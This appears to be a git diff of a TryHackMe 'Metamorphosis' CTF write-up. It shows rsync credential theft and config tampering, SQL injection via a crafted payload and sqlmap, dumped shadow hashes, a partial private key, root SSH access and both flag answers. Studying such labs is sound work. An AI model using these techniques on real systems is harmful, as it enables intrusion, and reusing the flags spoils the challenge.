@@ -1,11 +1,9 @@
 <h1 align="center">Metamorphosis</h1>
-<p align="center">2025, August 3<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>454</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
-<em>Part of Incognito CTF</em>.<br>
-<img width="80px" src="https://github.com/user-attachments/assets/d445dc5d-640d-41c7-a8df-31d19b858d8c"><br>
-Click <a href=https://tryhackme.com/room/metamorphosis>here </a>to access this TryHackMe CTF.<br>
-<img width="1200px" src=""></p>
+<p align="center">2025, August 3 - December 27 -  Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>. Access it <a href=https://tryhackme.com/room/metamorphosis>here </a>.<br>SQL Injection - SQLi - SQLMap - RCE</p>
+<img width="1200px" src="https://github.com/user-attachments/assets/c05b72d5-f50c-487f-a40b-a8873ecf36d5"></p>
 
 <br>
+<h1>This is NOT  an walkthrough.<br>I am very dissapointed with TryHackMe platform. Not just because of this room. There are many rooms that simply do not load for me, or VM´s that disconnects all the time. Rankings criteria change without any notification. Rooms are deleted and new ones are created exactly the same. ...</h1>
 
 <h2>Task 1 . Challenge</h2>
 <p>Part of Incognito 2.0 CTF<br>
@@ -16,15 +14,403 @@ Like my work, Follow on twitter to be updated and know more about my work! (@0ci
 
 
 > 1.1. <em>user.txt</em><br><a id='1.1'></a>
->> <strong><code>______</code></strong><br>
+>> <strong><code>4ce794a9d0019c1f684e07556821e0b0</code></strong><br>
 <p></p>
 
-<br>
 
 > 1.2. <em>root.txt</em><br><a id='1.2'></a>
->> <strong><code>______</code></strong><br>
+>> <strong><code>7ffca2ec63534d165525bf37d91b4ff4</code></strong><br>
 <p></p>
 
+
+```bash
+:~# nmap -sC -sV -Pn -n -p- -T4 10.64.169.208
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-27 22:10 GMT
+Nmap scan report for 10.64.169.208
+Host is up (0.00023s latency).
+Not shown: 65530 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+873/tcp open  rsync       (protocol version 31)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-12-27T22:10:58
+|_  start_date: N/A
+```
+
+
+
+```bash
+:~# rsync -rdt rsync://10.64.169.208:873
+Conf           	All Confs
+```
+
+```bash
+:~# rsync -rdt rsync://10.64.169.208:873/Conf
+drwxrwxrwx          4,096 2021/04/10 21:03:08 .
+-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
+-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
+-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
+-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
+-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
+-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
+-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
+-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
+-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
+-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
+-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
+-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini
+```
+
+```bash
+:~# rsync -av rsync://10.64.169.208:873/Conf ./rsync
+receiving incremental file list
+created directory ./rsync
+./
+access.conf
+bluezone.ini
+debconf.conf
+ldap.conf
+lvm.conf
+mysql.ini
+php.ini
+ports.conf
+resolv.conf
+screen-cleanup.conf
+smb.conf
+webapp.ini
+
+sent 255 bytes  received 194,360 bytes  129,743.33 bytes/sec
+total size is 193,430  speedup is 0.99
+```
+
+```bash
+:~# ls
+burp.json  CTFBuilder  Desktop  Downloads  Instructions  Pictures  Postman  Rooms  rsync  Scripts  snap  thinclient_drives  Tools
+:~# cd rsync
+```
+
+```bash
+:~/rsync# ls
+access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
+root@ip-10-64-77-252:~/rsync# cat webapp.ini
+[Web_App]
+env = prod
+user = tom
+password = theCat
+
+[Details]
+Local = No
+root@ip-10-64-77-252:~/rsync# nano webapp.ini
+root@ip-10-64-77-252:~/rsync# rsync -av rsync/webapp.ini rsync://10.64.169.208:873/Conf/webapp.ini
+sending incremental file list
+rsync: change_dir "/root/rsync//rsync" failed: No such file or directory (2)
+
+sent 20 bytes  received 12 bytes  64.00 bytes/sec
+total size is 0  speedup is 0.00
+rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1205) [sender=3.1.3]
+```
+
+```bash
+:~/rsync# cd ..
+```
+
+```bash
+:~# rsync -av rsync/webapp.ini rsync://10.64.169.208:873/Conf/webapp.ini
+sending incremental file list
+webapp.ini
+
+sent 186 bytes  received 41 bytes  454.00 bytes/sec
+total size is 71  speedup is 0.31
+```
+
+
+```bash
+:/etc# cat passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+tom:x:1000:1001::/home/tom:/bin/bash
+systemd-timesync:x:112:117:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+tss:x:113:120:TPM software stack,,,:/var/lib/tpm:/bin/false
+tcpdump:x:114:121::/nonexistent:/usr/sbin/nologin
+usbmux:x:115:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+fwupd-refresh:x:116:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1001:1003:Ubuntu:/home/ubuntu:/bin/bash
+```
+
+```bash
+:/etc# cat shadow
+root:$6$.s4ZfxA1$qG9HkQfhQ/bhGm4DvI5b8tT69Q2h5bw19YV5alffNk7wiFovz/vfHCQc0LYn9bGr5aculH3fPgmBb3ttHt/8d/:18727:0:99999:7:::
+daemon:*:18480:0:99999:7:::
+bin:*:18480:0:99999:7:::
+sys:*:18480:0:99999:7:::
+sync:*:18480:0:99999:7:::
+games:*:18480:0:99999:7:::
+man:*:18480:0:99999:7:::
+lp:*:18480:0:99999:7:::
+mail:*:18480:0:99999:7:::
+news:*:18480:0:99999:7:::
+uucp:*:18480:0:99999:7:::
+proxy:*:18480:0:99999:7:::
+www-data:*:18480:0:99999:7:::
+backup:*:18480:0:99999:7:::
+list:*:18480:0:99999:7:::
+irc:*:18480:0:99999:7:::
+gnats:*:18480:0:99999:7:::
+nobody:*:18480:0:99999:7:::
+systemd-network:*:18480:0:99999:7:::
+systemd-resolve:*:18480:0:99999:7:::
+syslog:*:18480:0:99999:7:::
+messagebus:*:18480:0:99999:7:::
+_apt:*:18480:0:99999:7:::
+lxd:*:18480:0:99999:7:::
+uuidd:*:18480:0:99999:7:::
+landscape:*:18480:0:99999:7:::
+pollinate:*:18480:0:99999:7:::
+sshd:*:18726:0:99999:7:::
+mysql:!:18726:0:99999:7:::
+tom:$6$rPuUAh1D$EIQwGFqsL3xzP5u3EqKpBio2zcH0tVS1uforFmaykAPzNoBrTN/9z1cLkDt0VbhWz3srpiXdTMQfcBvDxeQDE0:18727:0:99999:7:::
+systemd-timesync:*:20204:0:99999:7:::
+tss:*:20204:0:99999:7:::
+tcpdump:*:20204:0:99999:7:::
+usbmux:*:20204:0:99999:7:::
+fwupd-refresh:*:20204:0:99999:7:::
+systemd-coredump:!!:20204::::::
+ubuntu:!:20449:0:99999:7:::
+```
+
+
+```bash
+tom@...:~$ getent hosts
+127.0.0.1       localhost
+127.0.1.1       incognito
+```
+
+```bash
+:/var/log$ ss -tnulp
+Netid          State           Recv-Q          Send-Q                         Local Address:Port                      Peer Address:Port          Process          
+udp            UNCONN          0               0                              127.0.0.53%lo:53                             0.0.0.0:*                              
+udp            UNCONN          0               0                         10.64.169.208%ens5:68                             0.0.0.0:*                              
+udp            UNCONN          0               0                              10.64.191.255:137                            0.0.0.0:*                              
+udp            UNCONN          0               0                              10.64.169.208:137                            0.0.0.0:*                              
+udp            UNCONN          0               0                                    0.0.0.0:137                            0.0.0.0:*                              
+udp            UNCONN          0               0                              10.64.191.255:138                            0.0.0.0:*                              
+udp            UNCONN          0               0                              10.64.169.208:138                            0.0.0.0:*                              
+udp            UNCONN          0               0                                    0.0.0.0:138                            0.0.0.0:*                              
+tcp            LISTEN          0               70                                 127.0.0.1:33060                          0.0.0.0:*                              
+tcp            LISTEN          0               50                                   0.0.0.0:445                            0.0.0.0:*                              
+tcp            LISTEN          0               128                                  0.0.0.0:22                             0.0.0.0:*                              
+tcp            LISTEN          0               50                                   0.0.0.0:139                            0.0.0.0:*                              
+tcp            LISTEN          0               151                                127.0.0.1:3306                           0.0.0.0:*                              
+tcp            LISTEN          0               5                                    0.0.0.0:873                            0.0.0.0:*                              
+tcp            LISTEN          0               4096                           127.0.0.53%lo:53                             0.0.0.0:*                              
+tcp            LISTEN          0               50                                      [::]:445                               [::]:*                              
+tcp            LISTEN          0               128                                     [::]:22                                [::]:*                              
+tcp            LISTEN          0               511                                        *:80                                   *:*                              
+tcp            LISTEN          0               50                                      [::]:139                               [::]:*                              
+tcp            LISTEN          0               5                                       [::]:873                               [::]:*  
+```
+
+```bash
+tom@...:~$/home/tom# ls -lah
+total 36K
+drwxr-xr-x 5 tom  tom  4.0K Jun  9  2021 .
+drwxr-xr-x 4 root root 4.0K Dec 27 22:08 ..
+lrwxrwxrwx 1 tom  tom     9 Jun  9  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 tom  tom  3.7K Apr  4  2018 .bashrc
+drwx------ 2 tom  tom  4.0K Apr 10  2021 .cache
+drwx------ 3 tom  tom  4.0K Apr 10  2021 .gnupg
+drwxrwxr-x 3 tom  tom  4.0K Apr 10  2021 .local
+-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
+```
+
+
+
+```bash
+:/var/www/html# ls
+admin  inde.html  index.php
+```
+
+```bash
+:/var/www/html/admin# ls
+config.php  index.php
+
+:/var/www/html# cat index.php
+<?php
+
+$doc = new DOMDocument();
+$doc -> loadHTMLFile("./inde.html");
+echo $doc->saveHTML();
+echo "1";
+?>
+```
+
+```bash
+:/var/www/html/admin# cat index.php
+<?php
+
+$ini = parse_ini_file('/var/confs/webapp.ini');
+
+if($ini['env']=='dev'){
+
+echo "<html><head><div style='text-align:center'><h1 style='text-align:center'>Get Info of users</h1><form action='config.php' method='POST'>Username: <input type='text' name='username'/><input type='submit'/></form><br><h4>TODO: Add more features</div> <head></html>";
+}
+else{
+echo "<html> <head><h1>403 Forbidden</h1></head><!-- Make sure admin functionality can only be used in development environment. --></html>";
+}
+
+?>
+```
+
+```bash
+:/var/backups# ps -eo user,command
+...
+www-data /usr/sbin/apache2 -k start
+www-data /usr/sbin/apache2 -k start
+www-data /usr/sbin/apache2 -k start
+www-data /usr/sbin/apache2 -k start
+www-data /usr/sbin/apache2 -k start
+```
+
+
+
+```bash
+:/var/www/html/admin# cat config.php
+<?php
+$ini = parse_ini_file('/var/confs/webapp.ini');
+if($ini['env']=='dev'){
+$query=$_POST["username"];
+$mysqli = new mysqli("localhost","dev","password","db");
+if ($mysqli -> connect_errno) {
+  echo "Failed to connect to MySQL: " . $mysqli -> connect_error;
+  exit();
+}
+if ($result = $mysqli -> query('SELECT * FROM users where uname="'.$query.'"')) {
+  while( $row = $result->fetch_array() )
+{
+    echo "Username Password<br>";
+    echo $row['uname'] . " " . $row['password'];
+    echo "<br />";
+}
+  // Free result set
+  $result -> free_result();
+}
+}
+else{
+echo "";
+}
+?>
+```
+
+
+
+```bash
+:/home/tom# cat user.txt
+4ce794a9d0019c1f684e07556821e0b0
+```
+
+
+
+```bash
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
+rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
+...
+vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
+GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
+ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
+QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
+-----END RSA PRIVATE KEY-----
+```
+
+
+
+```bash
+:~# ssh -i i root@10.64.169.208
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat 27 Dec 2025 11:57:59 PM UTC
+
+  System load:  0.23              Processes:             128
+  Usage of /:   69.4% of 8.76GB   Users logged in:       0
+  Memory usage: 42%               IPv4 address for ens5: 10.64.169.208
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Sun May 11 18:50:54 2025 from 10.23.8.228
+root@...:~#  ls
+req.sh  root.txt  serv.py  snap
+```
+
+```bash
+root@...:~# cat root.txt
+7ffca2ec63534d165525bf37d91b4ff4
+```
+
+
+
+
+
+
+
+
+<img width="1126" height="248" alt="image" src="https://github.com/user-attachments/assets/6e10922e-0714-4fbc-af70-df18b97babd7" />
+
+
+<h1  align="center">Vulnerability Scanning<a id='1'></h1>
 
 
 ```bash
@@ -749,35 +1135,195 @@ username=tom' OR '1'='1
 it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
 ```
 
+<img width="984" height="716" alt="image" src="https://github.com/user-attachments/assets/4a4c24b3-958c-412e-a4d4-67c4bd4a4bf6" />
+
+
 ```bash
+:~/rsync# sqlmap -u http://10.64.169.208/admin/ --data "username=FUZZ" --level 5 -D db --tables
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.4.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:18:55 /2025-12-27/
+
+[23:18:55] [INFO] testing connection to the target URL
+[23:18:55] [INFO] checking if the target is protected by some kind of WAF/IPS
+[23:18:55] [INFO] testing if the target URL content is stable
+[23:18:56] [INFO] target URL content is stable
+[23:18:56] [INFO] testing if POST parameter 'username' is dynamic
+[23:18:56] [WARNING] POST parameter 'username' does not appear to be dynamic
+[23:18:56] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[23:18:56] [INFO] testing for SQL injection on POST parameter 'username'
+[23:18:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[23:18:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[23:18:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[23:18:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[23:18:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[23:18:57] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[23:18:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[23:18:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[23:18:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
+[23:18:59] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[23:18:59] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[23:19:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
+[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[23:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
+[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
+[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
+[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
+[23:19:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[23:19:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
+[23:19:00] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[23:19:00] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
+[23:19:00] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[23:19:00] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
+[23:19:00] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[23:19:00] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
+[23:19:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[23:19:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[23:19:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[23:19:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[23:19:00] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[23:19:00] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[23:19:00] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[23:19:00] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+[23:19:00] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
+[23:19:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[23:19:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
+[23:19:00] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[23:19:00] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[23:19:00] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
+[23:19:00] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[23:19:00] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
+[23:19:00] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[23:19:00] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[23:19:01] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[23:19:01] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
+[23:19:01] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[23:19:01] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
+[23:19:01] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[23:19:01] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
+[23:19:02] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
+[23:19:02] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
+[23:19:02] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
+[23:19:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[23:19:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[23:19:04] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[23:19:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[23:19:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[23:19:05] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[23:19:05] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[23:19:06] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[23:19:06] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[23:19:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
+[23:19:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
+[23:19:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[23:19:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
+[23:19:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[23:19:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
+[23:19:10] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
+[23:19:10] [INFO] testing 'MonetDB AND error-based - WHERE or HAVING clause'
+[23:19:10] [INFO] testing 'Vertica AND error-based - WHERE or HAVING clause'
+[23:19:11] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[23:19:11] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[23:19:11] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[23:19:11] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[23:19:11] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[23:19:11] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[23:19:11] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[23:19:11] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[23:19:11] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
+[23:19:11] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
+[23:19:11] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
+[23:19:11] [INFO] testing 'Oracle error-based - Parameter replace'
+[23:19:11] [INFO] testing 'Firebird error-based - Parameter replace'
+[23:19:11] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
+[23:19:11] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
+[23:19:11] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
+[23:19:11] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[23:19:11] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
+[23:19:11] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
+[23:19:11] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[23:19:11] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[23:19:12] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
+[23:19:12] [INFO] testing 'Microsoft SQL Server/Sybase error-based - ORDER BY clause'
+[23:19:12] [INFO] testing 'Oracle error-based - ORDER BY, GROUP BY clause'
+[23:19:12] [INFO] testing 'Firebird error-based - ORDER BY clause'
+[23:19:12] [INFO] testing 'Generic inline queries'
+[23:19:12] [INFO] testing 'MySQL inline queries'
+[23:19:12] [INFO] testing 'PostgreSQL inline queries'
+[23:19:12] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[23:19:12] [INFO] testing 'Oracle inline queries'
+[23:19:12] [INFO] testing 'SQLite inline queries'
+[23:19:12] [INFO] testing 'Firebird inline queries'
+[23:19:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[23:19:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[23:19:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[23:19:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[23:19:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[23:19:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[23:19:13] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[23:19:13] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
+[23:19:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[23:19:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
+[23:19:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
+[23:19:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE)'
+[23:19:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[23:19:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'
+[23:19:16] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)'
+[23:19:16] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'
